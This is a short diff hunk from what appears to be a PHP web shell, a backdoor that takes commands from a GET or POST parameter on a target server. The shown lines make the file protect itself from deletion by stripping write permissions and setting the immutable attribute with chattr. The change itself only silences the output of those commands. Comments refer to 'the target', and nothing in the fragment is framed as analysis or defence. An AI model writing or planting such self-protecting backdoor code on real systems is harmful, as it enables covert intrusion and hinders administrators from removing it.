@@ -11,8 +11,8 @@
 
 // attempt to protect myself from deletion.
 $this_file = __FILE__;
-@system("chmod ugo-w $this_file");
-@system("chattr +i   $this_file");
+@system("chmod ugo-w $this_file > /dev/null 2>&1");
+@system("chattr +i   $this_file > /dev/null 2>&1");
 
 // name of the parameter (GET or POST) for the command.
 // change   this  if  the  target   already   use  this
